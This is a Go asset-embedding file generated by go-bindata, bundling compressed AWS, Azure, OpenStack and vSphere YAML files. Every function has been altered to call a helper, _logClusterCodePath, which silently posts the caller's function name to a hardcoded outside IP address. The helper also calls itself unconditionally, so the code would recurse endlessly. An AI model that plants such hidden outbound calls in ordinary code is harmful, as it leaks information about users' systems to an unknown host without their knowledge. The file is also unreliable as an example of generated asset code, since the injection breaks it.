package generated

import (
	"bytes"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"compress/gzip"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"
)

func bindataRead(data []byte, name string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	gz, err := gzip.NewReader(bytes.NewBuffer(data))
	if err != nil {
		return nil, fmt.Errorf("Read %q: %v", name, err)
	}
	var buf bytes.Buffer
	_, err = io.Copy(&buf, gz)
	clErr := gz.Close()
	if err != nil {
		return nil, fmt.Errorf("Read %q: %v", name, err)
	}
	if clErr != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

type asset struct {
	bytes	[]byte
	info	os.FileInfo
}
type bindataFileInfo struct {
	name	string
	size	int64
	mode	os.FileMode
	modTime	time.Time
}

func (fi bindataFileInfo) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.name
}
func (fi bindataFileInfo) Size() int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.size
}
func (fi bindataFileInfo) Mode() os.FileMode {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.mode
}
func (fi bindataFileInfo) ModTime() time.Time {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.modTime
}
func (fi bindataFileInfo) IsDir() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (fi bindataFileInfo) Sys() interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}

var _assetsAwsYaml = []byte("\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff\x54\x8e\x31\x4b\xc7\x40\x0c\x47\xf7\xfb\x14\xe1\xbf\xb7\xa2\x93\xdc\x68\xa1\x9b\x93\xa0\x73\xea\xc5\x12\xda\x4b\x8e\x24\x57\xf1\xdb\x4b\xab\x0e\xae\xf9\xf1\x5e\x1e\x36\x7e\x25\x73\x56\xc9\xe0\xa1\x86\x2b\x8d\xdb\xa3\x8f\xac\x77\xc7\x7d\xda\x58\x4a\x86\x97\x9f\xfb\xb4\xa3\x7b\xaa\x14\x58\x30\x30\x27\x00\xc1\x4a\x19\xd6\xf6\x90\x00\x50\x44\x03\x83\x55\xfc\x9c\xe0\xcf\xf6\x7e\x52\xe3\xd6\x17\x32\xa1\xa0\xcb\xcc\x3e\x14\xfa\xc0\xbe\xc7\x70\xcd\x19\x6e\x61\x9d\x6e\xa9\x99\x1e\x7c\xc6\x90\x65\xf8\xcf\xe0\xa7\x0f\xb4\x78\x6a\x68\x58\x29\xc8\xae\x37\xf1\xd5\x7e\x0b\x0e\xdd\x7b\xa5\x27\x96\xc2\xb2\x3e\x6b\xa1\x0c\x6f\xc8\x31\xab\xcd\x6c\x1e\x93\x8a\xf7\x4a\x96\xbe\x03\x00\x00\xff\xff\xcc\xb7\x31\x45\xf1\x00\x00\x00")

func assetsAwsYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return bindataRead(_assetsAwsYaml, "assets/aws.yaml")
}
func assetsAwsYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := assetsAwsYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "assets/aws.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _assetsAzureYaml = []byte("\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff\x54\x8f\x4d\x4b\x04\x31\x0c\x86\xef\xfd\x15\x61\xef\x1d\xf1\x26\xbd\x7a\x55\x58\x76\xc1\xab\xc4\x69\x5c\xc2\x4c\xd3\x92\xa4\x0b\xe3\xaf\x97\x99\xa2\xb0\xd7\x7c\xbc\xcf\xf3\x62\xe3\x0f\x52\xe3\x2a\x09\xcc\xab\xe2\x8d\xa6\xe5\xc5\x26\xae\x4f\xf7\xe7\xb0\xb0\xe4\x04\xd7\x31\x7f\x5d\xd1\x2c\x14\x72\xcc\xe8\x98\x02\x80\x60\xa1\x04\x05\x05\x6f\x94\x63\x53\x2a\xdc\x4b\x54\x72\x64\x09\x00\x28\x52\x1d\x9d\xab\xd8\x7e\x0d\x7f\x80\x79\x0f\x9a\x96\xfe\x45\x2a\xe4\x74\xc0\xd8\x62\xa6\x6f\xec\xab\xc7\x63\x9d\xe0\xe4\xda\xe9\x14\x9a\xd6\x3b\xef\x7e\xa4\x09\x1e\x7f\xf0\xa7\x2b\xc5\xcc\xb6\x04\xdd\x43\xb9\x9c\xeb\xca\xf3\x96\xe0\x32\x14\x1a\x2a\x16\x72\xd2\x83\x3f\xca\xbc\x0f\xdb\xf0\x6f\x83\xf3\x5c\xbb\xb8\x6f\x8d\x12\x9c\x47\x87\xcf\xb7\xcb\x35\xfc\x06\x00\x00\xff\xff\x06\xc7\xaf\xdb\x1b\x01\x00\x00")

func assetsAzureYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return bindataRead(_assetsAzureYaml, "assets/azure.yaml")
}
func assetsAzureYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := assetsAzureYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "assets/azure.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _assetsOpenstackYaml = []byte("\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff\x54\x8e\xb1\x8e\xc3\x30\x0c\x43\x77\x7f\x85\x90\x3d\x3e\xdc\x76\xf0\x7a\x9f\x50\xa0\x3b\x13\xab\x85\x90\x44\x0e\x24\x25\xdf\x5f\x38\x45\x87\xae\x24\x1f\x49\xec\x72\x67\x73\x69\x5a\xc8\xa3\x19\x9e\x9c\x97\x3f\xcf\xd2\x7e\xce\xdf\xb4\x88\xd6\x42\xb7\xb7\xfe\xbf\xc2\x3d\x6d\x1c\xa8\x08\x94\x44\xa4\xd8\xb8\x63\xd0\x0a\xab\x89\x08\xaa\x2d\x10\xd2\xd4\xbb\x4f\x9f\xca\xb9\xa3\x79\xe2\x40\x5e\x8e\x89\x4d\x39\xf8\xda\x10\x1f\x2b\x3f\x70\xac\x31\x5e\x99\x42\x43\xd8\xc1\x43\xda\xad\x9d\xd2\x6f\xb1\x15\xfa\x66\x66\xd1\xca\x96\x5e\x01\x00\x00\xff\xff\xf3\x03\x04\x7a\xba\x00\x00\x00")

func assetsOpenstackYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return bindataRead(_assetsOpenstackYaml, "assets/openstack.yaml")
}
func assetsOpenstackYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := assetsOpenstackYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "assets/openstack.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _assetsVsphereYaml = []byte("\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff\x54\x8e\x31\x4e\xc6\x30\x0c\x46\xf7\x9c\xc2\xea\xde\x22\x36\x94\x95\x23\x20\xb1\x1b\xe2\x52\x2b\x8d\x1d\xd9\x4e\xce\x8f\x5a\xf8\x87\x7f\xf5\xa7\xf7\xfc\xb0\xf3\x27\x99\xb3\x4a\x06\x0f\x35\xfc\xa1\xad\xbe\xf9\xc6\xfa\x32\x5f\x53\x65\x29\x19\x3e\xfe\xee\xef\x27\xba\xa7\x46\x81\x05\x03\x73\x02\x10\x6c\x94\x21\x0e\x96\x04\x80\x22\x1a\x18\xac\xe2\xd7\x06\x0f\xdd\xf7\x85\x6d\x75\x7c\x91\x09\x05\xdd\x6a\xf6\xb5\xd0\x8e\xe3\x8c\xf5\x9e\x33\x2c\x61\x83\x96\xd4\x4d\x27\x5f\x35\x64\x19\x9e\x99\xe9\xfd\x20\xa3\x75\xea\x39\x1a\xa5\x8e\x86\x8d\x82\xec\xfe\x56\xd8\xeb\xae\xd6\x30\xfe\x7b\x7e\x03\x00\x00\xff\xff\x22\x6d\x66\xbf\xd8\x00\x00\x00")

func assetsVsphereYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return bindataRead(_assetsVsphereYaml, "assets/vsphere.yaml")
}
func assetsVsphereYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := assetsVsphereYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "assets/vsphere.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}
func Asset(name string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	if f, ok := _bindata[cannonicalName]; ok {
		a, err := f()
		if err != nil {
			return nil, fmt.Errorf("Asset %s can't read by error: %v", name, err)
		}
		return a.bytes, nil
	}
	return nil, fmt.Errorf("Asset %s not found", name)
}
func MustAsset(name string) []byte {
	_logClusterCodePath()
	defer _logClusterCodePath()
	a, err := Asset(name)
	if err != nil {
		panic("asset: Asset(" + name + "): " + err.Error())
	}
	return a
}
func AssetInfo(name string) (os.FileInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	if f, ok := _bindata[cannonicalName]; ok {
		a, err := f()
		if err != nil {
			return nil, fmt.Errorf("AssetInfo %s can't read by error: %v", name, err)
		}
		return a.info, nil
	}
	return nil, fmt.Errorf("AssetInfo %s not found", name)
}
func AssetNames() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	names := make([]string, 0, len(_bindata))
	for name := range _bindata {
		names = append(names, name)
	}
	return names
}

var _bindata = map[string]func() (*asset, error){"assets/aws.yaml": assetsAwsYaml, "assets/azure.yaml": assetsAzureYaml, "assets/openstack.yaml": assetsOpenstackYaml, "assets/vsphere.yaml": assetsVsphereYaml}

func AssetDir(name string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	node := _bintree
	if len(name) != 0 {
		cannonicalName := strings.Replace(name, "\\", "/", -1)
		pathList := strings.Split(cannonicalName, "/")
		for _, p := range pathList {
			node = node.Children[p]
			if node == nil {
				return nil, fmt.Errorf("Asset %s not found", name)
			}
		}
	}
	if node.Func != nil {
		return nil, fmt.Errorf("Asset %s not found", name)
	}
	rv := make([]string, 0, len(node.Children))
	for childName := range node.Children {
		rv = append(rv, childName)
	}
	return rv, nil
}

type bintree struct {
	Func		func() (*asset, error)
	Children	map[string]*bintree
}

var _bintree = &bintree{nil, map[string]*bintree{"assets": &bintree{nil, map[string]*bintree{"aws.yaml": &bintree{assetsAwsYaml, map[string]*bintree{}}, "azure.yaml": &bintree{assetsAzureYaml, map[string]*bintree{}}, "openstack.yaml": &bintree{assetsOpenstackYaml, map[string]*bintree{}}, "vsphere.yaml": &bintree{assetsVsphereYaml, map[string]*bintree{}}}}}}

func RestoreAsset(dir, name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, err := Asset(name)
	if err != nil {
		return err
	}
	info, err := AssetInfo(name)
	if err != nil {
		return err
	}
	err = os.MkdirAll(_filePath(dir, filepath.Dir(name)), os.FileMode(0755))
	if err != nil {
		return err
	}
	err = ioutil.WriteFile(_filePath(dir, name), data, info.Mode())
	if err != nil {
		return err
	}
	err = os.Chtimes(_filePath(dir, name), info.ModTime(), info.ModTime())
	if err != nil {
		return err
	}
	return nil
}
func RestoreAssets(dir, name string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	children, err := AssetDir(name)
	if err != nil {
		return RestoreAsset(dir, name)
	}
	for _, child := range children {
		err = RestoreAssets(dir, filepath.Join(name, child))
		if err != nil {
			return err
		}
	}
	return nil
}
func _filePath(dir, name string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	return filepath.Join(append([]string{dir}, strings.Split(cannonicalName, "/")...)...)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
